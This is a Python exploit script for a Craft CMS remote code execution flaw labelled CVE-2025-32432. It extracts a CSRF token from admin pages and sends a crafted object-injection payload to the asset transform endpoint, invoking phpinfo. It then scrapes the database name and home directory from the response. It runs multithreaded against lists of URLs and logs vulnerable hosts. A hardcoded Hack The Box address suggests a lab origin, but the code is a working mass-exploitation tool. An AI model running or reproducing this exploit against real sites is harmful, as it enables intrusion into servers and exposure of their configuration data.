#!/usr/bin/env python3
import argparse
import concurrent.futures
import re
import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CraftCMSExploit:
    def __init__(self, url, host_header=None):
        self.base_url = url if url.endswith('/') else url + '/'
        self.host_header = host_header
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

    def extract_csrf_token(self):
        try:
            headers = {}
            if self.host_header:
                headers['Host'] = self.host_header

            # Try multiple admin URLs
            urls_to_try = [
                self.base_url + "index.php?p=admin/dashboard",
                self.base_url + "admin/dashboard",
                self.base_url + "index.php?p=admin/login",
                self.base_url + "admin/login"
            ]

            for url in urls_to_try:
                response = self.session.get(url, headers=headers, timeout=10, allow_redirects=True)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    csrf_input = soup.find('input', {'name': 'CRAFT_CSRF_TOKEN'})
                    if csrf_input and csrf_input.get('value'):
                        return csrf_input.get('value')
                    match = re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', response.text)
                    if match:
                        return match.group(1)

            return None
        except Exception as e:
            print(f"  Error extracting CSRF token: {str(e)}")
            return None

    def exploit(self):
        result = {'url': self.base_url, 'vulnerable': False, 'db_name': None, 'home_dir': None, 'error': None}
        try:
            csrf_token = self.extract_csrf_token()
            if not csrf_token:
                result['error'] = "Failed to extract CSRF token"
                return result

            exploit_url = self.base_url + "index.php?p=admin/actions/assets/generate-transform"
            headers = {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrf_token
            }
            if self.host_header:
                headers['Host'] = self.host_header

            payload = {
                "assetId": 11,
                "handle": {
                    "width": 123,
                    "height": 123,
                    "as session": {
                        "class": "craft\\behaviors\\FieldLayoutBehavior",
                        "__class": "GuzzleHttp\\Psr7\\FnStream",
                        "__construct()": [[]],
                        "_fn_close": "phpinfo"
                    }
                }
            }

            response = self.session.post(exploit_url, json=payload, headers=headers, timeout=15)

            if 'PHP Version' in response.text and 'PHP License' in response.text:
                result['vulnerable'] = True
                db_match = re.search(r'CRAFT_DB_DATABASE\s+([^\s]+)', response.text)
                if db_match:
                    result['db_name'] = db_match.group(1).strip()
                home_match = re.search(r'\$_SERVER\[.HOME.\]\s+([^\s]+)', response.text)
                if home_match:
                    result['home_dir'] = home_match.group(1).strip()
                if not result['home_dir']:
                    alt_home_match = re.search(r'HOME\s+([^\s]+)', response.text)
                    if alt_home_match:
                        result['home_dir'] = alt_home_match.group(1).strip()
                result['phpinfo'] = response.text[:5000]
            return result
        except Exception as e:
            result['error'] = str(e)
            return result


def process_url(url):
    try:
        if not url.startswith('http'):
            url = 'http://' + url
        print(f"[*] Testing {url}")
        host_header = None
        if 'orion' in url.lower() or '10.129.54.140' in url:
            host_header = 'orion.htb'
            url = 'http://10.129.54.140'

        exploit = CraftCMSExploit(url, host_header=host_header)
        result = exploit.exploit()
        if result['vulnerable']:
            print(f"[+] VULNERABLE: {url}")
            print(f"    CRAFT_DB_DATABASE: {result['db_name'] or 'Not found'}")
            print(f"    HOME Directory: {result['home_dir'] or 'Not found'}")
            with open('vulnerable.txt', 'a') as f:
                f.write(f"{url},{result['db_name'] or 'Not found'},{result['home_dir'] or 'Not found'}\n")
            if result.get('phpinfo'):
                with open('phpinfo_output.txt', 'w') as f:
                    f.write(result['phpinfo'])
        elif result['error']:
            print(f"[-] ERROR ({url}): {result['error']}")
        else:
            print(f"[-] Not vulnerable: {url}")
        return result
    except Exception as e:
        print(f"[-] Error processing {url}: {str(e)}")
        return {'url': url, 'vulnerable': False, 'error': str(e)}


def main():
    parser = argparse.ArgumentParser(description='CraftCMS CVE-2025-32432 RCE Exploit')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', '--file', help='File containing URLs to test')
    group.add_argument('-u', '--url', help='Single URL to test')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    args = parser.parse_args()

    urls = []
    if args.url:
        urls = [args.url]
        print(f"[*] Testing single target: {args.url}")
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(urls)} URLs from {args.file}")
        except Exception as e:
            print(f"Error reading URL file: {str(e)}")
            sys.exit(1)

    print(f"[*] Starting scan with {args.threads} threads")
    with open('vulnerable.txt', 'w') as f:
        f.write("url,craft_db_database,home_directory\n")

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        results = list(executor.map(process_url, urls))

    vulnerable_count = sum(1 for r in results if r['vulnerable'])
    print("\n=== SCAN SUMMARY ===")
    print(f"Total URLs scanned: {len(urls)}")
    print(f"Vulnerable sites: {vulnerable_count}")

if __name__ == "__main__":
    main()
